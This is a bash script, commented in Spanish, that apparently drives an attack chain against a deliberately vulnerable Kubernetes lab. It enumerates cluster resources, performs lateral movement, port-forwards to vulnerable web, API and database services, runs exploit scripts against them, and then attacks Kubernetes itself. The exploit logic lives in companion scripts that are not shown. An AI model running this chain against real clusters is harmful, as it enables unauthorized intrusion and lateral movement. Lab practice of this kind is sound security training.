#!/bin/bash

# Script maestro para explotar todas las vulnerabilidades y moverse lateralmente

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo -e "${BLUE}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     Script Maestro de Explotación y Movimiento Lateral      ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

# Verificar que estamos en el bastión o tenemos las herramientas necesarias
if ! command -v kubectl &> /dev/null && ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: kubectl o aws CLI no están instalados${NC}"
    exit 1
fi

# Obtener información del entorno
if [ -z "$AWS_REGION" ]; then
    export AWS_REGION=$(aws configure get region || echo "us-east-1")
fi

if [ -z "$CLUSTER_NAME" ]; then
    export CLUSTER_NAME="lab-cluster"
fi

echo -e "${YELLOW}Configuración:${NC}"
echo -e "  Región: $AWS_REGION"
echo -e "  Cluster: $CLUSTER_NAME"
echo ""

# Paso 1: Configurar acceso al cluster
echo -e "${BLUE}[Paso 1] Configurando acceso al cluster Kubernetes...${NC}"
if command -v aws &> /dev/null; then
    aws eks update-kubeconfig --region "$AWS_REGION" --name "$CLUSTER_NAME" 2>/dev/null && \
        echo -e "${GREEN}✓ Acceso al cluster configurado${NC}" || \
        echo -e "${YELLOW}⚠ No se pudo configurar el acceso al cluster${NC}"
else
    echo -e "${YELLOW}⚠ AWS CLI no disponible, saltando configuración${NC}"
fi
echo ""

# Paso 2: Enumerar recursos
echo -e "${BLUE}[Paso 2] Enumerando recursos del cluster...${NC}"
"$SCRIPT_DIR/enumerate-resources.sh" 2>/dev/null || echo -e "${YELLOW}⚠ Error en enumeración${NC}"
echo ""

# Paso 3: Movimiento lateral
echo -e "${BLUE}[Paso 3] Realizando movimiento lateral...${NC}"
"$SCRIPT_DIR/lateral-movement.sh" 2>/dev/null || echo -e "${YELLOW}⚠ Error en movimiento lateral${NC}"
echo ""

# Paso 4: Explotar aplicaciones vulnerables (si están accesibles)
echo -e "${BLUE}[Paso 4] Explotando aplicaciones vulnerables...${NC}"

# Obtener servicios
SERVICES=$(kubectl get services -n vulnerable-apps -o jsonpath='{.items[*].metadata.name}' 2>/dev/null || echo "")

if [ -n "$SERVICES" ]; then
    # Configurar port-forwarding para cada servicio
    for SERVICE in $SERVICES; do
        case $SERVICE in
            vulnerable-web-app)
                echo -e "${YELLOW}  Configurando port-forward para $SERVICE...${NC}"
                kubectl port-forward -n vulnerable-apps svc/$SERVICE 3000:3000 > /dev/null 2>&1 &
                PF_PID=$!
                sleep 2
                echo -e "${GREEN}  ✓ Port-forward activo (PID: $PF_PID)${NC}"
                "$SCRIPT_DIR/exploit-web-app.sh" http://localhost:3000 2>/dev/null || true
                kill $PF_PID 2>/dev/null || true
                ;;
            vulnerable-api)
                echo -e "${YELLOW}  Configurando port-forward para $SERVICE...${NC}"
                kubectl port-forward -n vulnerable-apps svc/$SERVICE 5000:5000 > /dev/null 2>&1 &
                PF_PID=$!
                sleep 2
                echo -e "${GREEN}  ✓ Port-forward activo (PID: $PF_PID)${NC}"
                "$SCRIPT_DIR/exploit-api.sh" http://localhost:5000 2>/dev/null || true
                kill $PF_PID 2>/dev/null || true
                ;;
            vulnerable-database)
                echo -e "${YELLOW}  Configurando port-forward para $SERVICE...${NC}"
                kubectl port-forward -n vulnerable-apps svc/$SERVICE 3306:3306 > /dev/null 2>&1 &
                PF_PID=$!
                sleep 2
                echo -e "${GREEN}  ✓ Port-forward activo (PID: $PF_PID)${NC}"
                "$SCRIPT_DIR/exploit-database.sh" localhost 3306 2>/dev/null || true
                kill $PF_PID 2>/dev/null || true
                ;;
        esac
    done
else
    echo -e "${YELLOW}  ⚠ No se encontraron servicios vulnerables${NC}"
fi
echo ""

# Paso 5: Explotar vulnerabilidades de Kubernetes
echo -e "${BLUE}[Paso 5] Explotando vulnerabilidades de Kubernetes...${NC}"
"$SCRIPT_DIR/exploit-k8s.sh" vulnerable-apps 2>/dev/null || echo -e "${YELLOW}⚠ Error explotando Kubernetes${NC}"
echo ""

echo -e "${GREEN}══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  Explotación Completa Finalizada${NC}"
echo -e "${GREEN}══════════════════════════════════════════════════════════════${NC}"

